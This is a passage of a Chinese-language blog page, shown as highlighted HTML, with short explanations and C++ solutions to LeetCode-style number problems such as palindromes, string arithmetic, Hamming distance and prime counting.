class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">plusOne</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; digits)</span> </span>&#123;<br>        <span class="hljs-type">int</span> n = digits.<span class="hljs-built_in">size</span>();<br>        <span class="hljs-type">int</span> index = n - <span class="hljs-number">1</span>;<br><br>        <span class="hljs-keyword">while</span> (index &gt;= <span class="hljs-number">0</span> &amp;&amp; digits[index] == <span class="hljs-number">9</span>) &#123;<br>            digits[index--] = <span class="hljs-number">0</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (index &gt;= <span class="hljs-number">0</span>) &#123;<br>            digits[index]++;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            digits.<span class="hljs-built_in">insert</span>(digits.<span class="hljs-built_in">begin</span>(), <span class="hljs-number">1</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> digits;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="最大回文数乘积">最大回文数乘积</h2><blockquote><p>从大到小枚举回文数，由于确定了回文数的左半部分，其右半部分也就确定了，因此我们只需要枚举左半部分，同时由于两个n 位整数的乘积至多是个 2n 位数，我们可以从 10<sup>n</sup> −1开始枚举回文数的左半部分。得到回文数 p 后，需要判断其能否分解成两个 n位整数。我们可以从 10<sup>n</sup> −1 开始从大到小枚举 x，若 x 能整除 p且 x 和 p/x 均为 n 位整数，则 p 就是我们要找的答案。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">largestPalindrome</span><span class="hljs-params">(<span class="hljs-type">int</span> n)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (n == <span class="hljs-number">1</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">9</span>;<br>        &#125;<br><br>        <span class="hljs-type">int</span> upper = <span class="hljs-built_in">pow</span>(<span class="hljs-number">10</span>, n) - <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> left = upper;; left--) &#123;<br>            <span class="hljs-type">long</span> p = left;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> x = left; x &gt; <span class="hljs-number">0</span>; x /= <span class="hljs-number">10</span>) &#123;<br>                p = p * <span class="hljs-number">10</span> + x % <span class="hljs-number">10</span>;<br>            &#125;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">long</span> x = upper; x * x &gt;= p; x--) &#123;<br>                <span class="hljs-keyword">if</span> (p % x == <span class="hljs-number">0</span>) &#123;<br>                    <span class="hljs-keyword">return</span> p % <span class="hljs-number">1337</span>;<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="寻找最近的回文数">寻找最近的回文数</h2><blockquote><p>分别计算出以下每一种可能的方案对应的回文整数，在其中找到与原数最近且不等于原数的数即为答案。</p><ul><li>用原数的前半部分替换后半部分得到的回文整数。</li><li>用原数的前半部分加一后的结果替换后半部分得到的回文整数。</li><li>用原数的前半部分减一后的结果替换后半部分得到的回文整数。</li><li>为防止位数变化导致构造的回文整数错误，因此直接构造 999…999 和100…001 作为备选答案。</li></ul></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">using</span> ULL = <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span>;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">vector&lt;ULL&gt; <span class="hljs-title">getCandidates</span><span class="hljs-params">(<span class="hljs-type">const</span> string&amp; n)</span> </span>&#123;<br>        <span class="hljs-type">int</span> len = n.<span class="hljs-built_in">length</span>();<br>        vector&lt;ULL&gt; candidates = &#123;<br>            (ULL)<span class="hljs-built_in">pow</span>(<span class="hljs-number">10</span>, len - <span class="hljs-number">1</span>) - <span class="hljs-number">1</span>,<br>            (ULL)<span class="hljs-built_in">pow</span>(<span class="hljs-number">10</span>, len) + <span class="hljs-number">1</span>,<br>        &#125;;<br>        ULL selfPrefix = <span class="hljs-built_in">stoull</span>(n.<span class="hljs-built_in">substr</span>(<span class="hljs-number">0</span>, (len + <span class="hljs-number">1</span>) / <span class="hljs-number">2</span>));<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i : &#123;selfPrefix - <span class="hljs-number">1</span>, selfPrefix, selfPrefix + <span class="hljs-number">1</span>&#125;) &#123;<br>            string prefix = <span class="hljs-built_in">to_string</span>(i);<br>            string candidate = prefix + <span class="hljs-built_in">string</span>(prefix.<span class="hljs-built_in">rbegin</span>() + (len &amp; <span class="hljs-number">1</span>), prefix.<span class="hljs-built_in">rend</span>());<br>            candidates.<span class="hljs-built_in">push_back</span>(<span class="hljs-built_in">stoull</span>(candidate));<br>        &#125;<br>        <span class="hljs-keyword">return</span> candidates;<br>    &#125;<br><br>    <span class="hljs-function">string <span class="hljs-title">nearestPalindromic</span><span class="hljs-params">(string n)</span> </span>&#123;<br>        ULL selfNumber = <span class="hljs-built_in">stoull</span>(n), ans = <span class="hljs-number">-1</span>;<br>        <span class="hljs-type">const</span> vector&lt;ULL&gt;&amp; candidates = <span class="hljs-built_in">getCandidates</span>(n);<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span>&amp; candidate : candidates) &#123;<br>            <span class="hljs-keyword">if</span> (candidate != selfNumber) &#123;<br>                <span class="hljs-keyword">if</span> (ans == <span class="hljs-number">-1</span> ||<br>                    <span class="hljs-built_in">llabs</span>(candidate - selfNumber) &lt; <span class="hljs-built_in">llabs</span>(ans - selfNumber) ||<br>                    <span class="hljs-built_in">llabs</span>(candidate - selfNumber) == <span class="hljs-built_in">llabs</span>(ans - selfNumber) &amp;&amp; candidate &lt; ans) &#123;<br>                    ans = candidate;<br>                &#125;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">to_string</span>(ans);<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="整数反转">整数反转</h2><blockquote><p><span class="math display">\[-2^{31} \leq \mathrm{ans} \cdot 10+\text { digit } \leq 2^{31}-1\]</span> 等价于： <span class="math display">\[\left\lceil\frac{-2^{31}}{10}\right\rceil \leq \operatorname{ans}\leq\left\lfloor\frac{2^{31}-1}{10}\right\rfloor\]</span></p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">reverse</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span> </span>&#123;<br>        <span class="hljs-type">int</span> ans = <span class="hljs-number">0</span>;<br><br>        <span class="hljs-keyword">while</span> (x != <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-keyword">if</span> (ans &lt; INT_MIN / <span class="hljs-number">10</span> || ans &gt; INT_MAX / <span class="hljs-number">10</span>) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>            &#125;<br>            <span class="hljs-type">int</span> digit = x % <span class="hljs-number">10</span>;<br>            x /= <span class="hljs-number">10</span>;<br>            ans = ans * <span class="hljs-number">10</span> + digit;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> ans;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="交替位二进制数">交替位二进制数</h2><blockquote><p>对输入 n 的二进制表示右移一位后，得到的数字再与 n 按位异或得到a。当且仅当输入 n 为交替位二进制数时，a 的二进制表示全为 1（不包括前导0）。将 a 与 a+1 按位与，当且仅当 a 的二进制表示全为 1 时，结果为0。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">hasAlternatingBits</span><span class="hljs-params">(<span class="hljs-type">int</span> n)</span> </span>&#123;<br>        <span class="hljs-type">long</span> a = n ^ (n &gt;&gt; <span class="hljs-number">1</span>);<br>        <span class="hljs-keyword">return</span> (a &amp; (a + <span class="hljs-number">1</span>)) == <span class="hljs-number">0</span>;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h1 id="数值计算">2. 数值计算</h1><h2 id="字符串相加">字符串相加</h2><blockquote><p>对两个大整数模拟「竖式加法」的过程。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">string <span class="hljs-title">addStrings</span><span class="hljs-params">(string num1, string num2)</span> </span>&#123;<br>        <span class="hljs-type">int</span> i = num1.<span class="hljs-built_in">length</span>() - <span class="hljs-number">1</span>, j = num2.<span class="hljs-built_in">length</span>() - <span class="hljs-number">1</span>;<br>        <span class="hljs-type">int</span> carry = <span class="hljs-number">0</span>;<br>        string ans;<br><br>        <span class="hljs-keyword">while</span> (i &gt;= <span class="hljs-number">0</span> || j &gt;= <span class="hljs-number">0</span> || carry) &#123;<br>            <span class="hljs-type">int</span> x = (i &gt;= <span class="hljs-number">0</span>) ? num1[i] - <span class="hljs-string">&#x27;0&#x27;</span> : <span class="hljs-number">0</span>;<br>            <span class="hljs-type">int</span> y = (j &gt;= <span class="hljs-number">0</span>) ? num2[j] - <span class="hljs-string">&#x27;0&#x27;</span> : <span class="hljs-number">0</span>;<br>            <span class="hljs-type">int</span> sum = x + y + carry;<br>            ans.<span class="hljs-built_in">push_back</span>(<span class="hljs-string">&#x27;0&#x27;</span> + sum % <span class="hljs-number">10</span>);<br>            carry = sum / <span class="hljs-number">10</span>;<br>            i--;<br>            j--;<br>        &#125;<br><br>        <span class="hljs-built_in">reverse</span>(ans.<span class="hljs-built_in">begin</span>(), ans.<span class="hljs-built_in">end</span>());<br><br>        <span class="hljs-keyword">return</span> ans;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="字符串相乘">字符串相乘</h2><blockquote><p>从右往左遍历乘数，将乘数的每一位与被乘数相乘得到对应的结果，再将每次得到的结果累加，整个过程中涉及到较多字符串相加的操作。如果使用数组代替字符串存储结果，则可以减少对字符串的操作。令m 和 n 分别表示 num 1和 num 2的长度，并且它们均不为 0，则 num 1和 num2的乘积的长度为 m+n−1 或 m+n。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">string <span class="hljs-title">multiply</span><span class="hljs-params">(string num1, string num2)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (num1 == <span class="hljs-string">&quot;0&quot;</span> || num2 == <span class="hljs-string">&quot;0&quot;</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;0&quot;</span>;<br>        &#125;<br><br>        <span class="hljs-type">int</span> m = num1.<span class="hljs-built_in">size</span>(), n = num2.<span class="hljs-built_in">size</span>();<br>        <span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">ansArr</span><span class="hljs-params">(m + n)</span></span>;<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = m - <span class="hljs-number">1</span>; i &gt;= <span class="hljs-number">0</span>; i--) &#123;<br>            <span class="hljs-type">int</span> x = num1[i] - <span class="hljs-string">&#x27;0&#x27;</span>;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = n - <span class="hljs-number">1</span>; j &gt;= <span class="hljs-number">0</span>; j--) &#123;<br>                <span class="hljs-type">int</span> y = num2[j] - <span class="hljs-string">&#x27;0&#x27;</span>;<br>                ansArr[i + j + <span class="hljs-number">1</span>] += x * y;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = m + n - <span class="hljs-number">1</span>; i &gt; <span class="hljs-number">0</span>; i--) &#123;<br>            ansArr[i - <span class="hljs-number">1</span>] += ansArr[i] / <span class="hljs-number">10</span>;<br>            ansArr[i] %= <span class="hljs-number">10</span>;<br>        &#125;<br><br>        <span class="hljs-type">int</span> index = (ansArr[<span class="hljs-number">0</span>] == <span class="hljs-number">0</span>) ? <span class="hljs-number">1</span> : <span class="hljs-number">0</span>;<br>        string ans;<br>        <span class="hljs-keyword">while</span> (index &lt; m + n) &#123;<br>            ans.<span class="hljs-built_in">push_back</span>(<span class="hljs-string">&#x27;0&#x27;</span> + ansArr[index]);<br>            index++;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> ans;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="下一个更大元素-iii">下一个更大元素 III</h2><blockquote><p>我们需要将一个左边的「较小数」与一个右边的「较大数」交换，以能够让当前排列变大，从而得到下一个排列。同时我们要让这个「较小数」尽量靠右，而「较大数」尽可能小。当交换完成后，「较大数」右边的数需要按照升序重新排列。这样可以在保证新排列大于原来排列的情况下，使变大的幅度尽可能小。</p><ol type="1"><li>首先从后向前查找第一个顺序对 (i,i+1)，满足a[i]&lt;a[i+1]。这样「较小数」即为 a[i]。此时[i+1,n)必然是下降序列。</li><li>如果找到了顺序对，那么在区间 [i+1,n) 中从后向前查找第一个元素 j 满足a[i]&lt;a[j]。这样「较大数」即为 a[j]。</li><li>交换 a[i] 与 a[j]，此时可以证明区间 [i+1,n)必为降序。我们可以直接使用双指针反转区间 [i+1,n)使其变为升序，而无需对该区间进行排序。</li></ol></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">nextGreaterElement</span><span class="hljs-params">(<span class="hljs-type">int</span> n)</span> </span>&#123;<br>        string nums = <span class="hljs-built_in">to_string</span>(n);<br>        <span class="hljs-type">int</span> i = nums.<span class="hljs-built_in">length</span>() - <span class="hljs-number">2</span>;<br><br>        <span class="hljs-keyword">while</span> (i &gt;= <span class="hljs-number">0</span> &amp;&amp; nums[i] &gt;= nums[i + <span class="hljs-number">1</span>]) &#123;<br>            i--;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (i &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>        &#125;<br><br>        <span class="hljs-type">int</span> j = nums.<span class="hljs-built_in">length</span>() - <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">while</span> (j &gt;= <span class="hljs-number">0</span> &amp;&amp; nums[i] &gt;= nums[j]) &#123;<br>            j--;<br>        &#125;<br>        <span class="hljs-built_in">swap</span>(nums[i], nums[j]);<br><br>        <span class="hljs-built_in">reverse</span>(nums.<span class="hljs-built_in">begin</span>() + i + <span class="hljs-number">1</span>, nums.<span class="hljs-built_in">end</span>());<br><br>        <span class="hljs-type">long</span> ans = <span class="hljs-built_in">stol</span>(nums);<br>        <span class="hljs-keyword">return</span> ans &gt; INT_MAX ? <span class="hljs-number">-1</span> : ans;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="回文数">回文数</h2><blockquote><p>将数字转换为字符串，通过双指针检查字符串是否为回文。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">isPalindrome</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (x &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br><br>        string temp = <span class="hljs-built_in">to_string</span>(x);<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>, j = temp.<span class="hljs-built_in">length</span>() - <span class="hljs-number">1</span>; i &lt; j; i++, j--) &#123;<br>            <span class="hljs-keyword">if</span> (temp[i] != temp[j]) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="各位相加">各位相加</h2><blockquote><p>模拟各位相加的过程，直到剩下的数字是一位数。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">addDigits</span><span class="hljs-params">(<span class="hljs-type">int</span> num)</span> </span>&#123;<br>        <span class="hljs-keyword">while</span> (num &gt;= <span class="hljs-number">10</span>) &#123;<br>            <span class="hljs-type">int</span> sum = <span class="hljs-number">0</span>;<br>            <span class="hljs-keyword">while</span> (num &gt; <span class="hljs-number">0</span>) &#123;<br>                sum += num % <span class="hljs-number">10</span>;<br>                num /= <span class="hljs-number">10</span>;<br>            &#125;<br>            num = sum;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> num;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="汉明距离">汉明距离</h2><blockquote><p>两个整数之间的汉明距离是对应位置上数字不同的位数。根据以上定义，我们使用异或运算，记为⊕，当且仅当输入位不同时输出为 1。计算 x 和 y 之间的汉明距离，可以先计算x⊕y，然后统计结果中等于 1 的位数。现在，原始问题转换为位计数问题。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">hammingDistance</span><span class="hljs-params">(<span class="hljs-type">int</span> x, <span class="hljs-type">int</span> y)</span> </span>&#123;<br>        <span class="hljs-type">int</span> s = x ^ y;<br>        <span class="hljs-type">int</span> ans = <span class="hljs-number">0</span>;<br><br>        <span class="hljs-keyword">while</span> (s) &#123;<br>            ans += s &amp; <span class="hljs-number">1</span>;<br>            s &gt;&gt;= <span class="hljs-number">1</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> ans;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="汉明距离总和">汉明距离总和</h2><blockquote><p>若长度为 n 的数组 nums 的所有元素二进制的第 i 位共有 c 个 1，n−c 个0，则些元素在二进制的第 i位上的汉明距离之和为c⋅(n−c)。可以从二进制的最低位到最高位，逐位统计汉明距离。将每一位上得到的汉明距离累加即为答案。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">totalHammingDistance</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; nums)</span> </span>&#123;<br>        <span class="hljs-type">int</span> ans = <span class="hljs-number">0</span>;<br>        <span class="hljs-type">int</span> n = nums.<span class="hljs-built_in">size</span>();<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">30</span>; i++) &#123;<br>            <span class="hljs-type">int</span> c = <span class="hljs-number">0</span>;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> val : nums) &#123;<br>                c += (val &gt;&gt; i) &amp; <span class="hljs-number">1</span>;<br>            &#125;<br>            ans += c * (n - c);<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> ans;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h1 id="数学问题">3. 数学问题</h1><h2 id="计数质数">计数质数</h2><blockquote><p>质数的定义：在大于 1 的自然数中，除了 1和它本身以外不再有其他因数的自然数。</p><p>法一：枚举。考虑到如果 y 是 x 的因数，那么 <spanclass="math display">\[\frac{x}{y} \]</span>也必然是 x的因数，因此我们只要校验 y 或者 <spanclass="math display">\[\frac{x}{y}\]</span>即可。而如果我们每次选择校验两者中的较小数，则不难发现较小数一定落在<spanclass="math display">\[[2,\sqrt{x}]\]</span>的区间中，因此我们只需要枚举<spanclass="math display">\[[2,\sqrt{x}]\]</span>中的所有数即可，这样单次检查的时间复杂度从O(n) 降低至了 <span class="math display">\[O(\sqrt{n})\]</span>。</p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">isPrime</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span> </span>&#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">2</span>; i * i &lt;= x; ++i) &#123;<br>            <span class="hljs-keyword">if</span> (x % i == <span class="hljs-number">0</span>) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">countPrimes</span><span class="hljs-params">(<span class="hljs-type">int</span> n)</span> </span>&#123;<br>        <span class="hljs-type">int</span> ans = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">2</span>; i &lt; n; ++i) &#123;<br>            ans += <span class="hljs-built_in">isPrime</span>(i);<br>        &#125;<br>        <span class="hljs-keyword">return</span> ans;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><blockquote><p>法二：如果 x 是质数，那么大于 x 的 x 的倍数 2x,3x,…一定不是质数，因此我们可以从这里入手。我们设 isPrime[i] 表示数 i是不是质数，如果是质数则为 1，否则为0。从小到大遍历每个数，如果这个数为质数，则将其所有的倍数都标记为合数（除了该质数本身），即0，这样在运行结束的时候我们即能知道质数的个数。</p><p>这种方法的正确性是比较显然的：这种方法显然不会将质数标记成合数；另一方面，当从小到大遍历到数x 时，倘若它是合数，则它一定是某个小于 x 的质数 y的整数倍，故根据此方法的步骤，我们在遍历到 y 时，就一定会在此时将 x标记为 isPrime[x]=0。因此，这种方法也不会将合数标记为质数。</p><p>当然这里还可以继续优化，对于一个质数 x，如果按上文说的我们从 2x开始标记其实是冗余的，应该直接从 <span class="math display">\[x\cdotx\]</span> 开始标记，因为 2x,3x,… 这些数一定在 x之前就被其他数的倍数标记过了，例如 2 的所有倍数，3 的所有倍数等。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 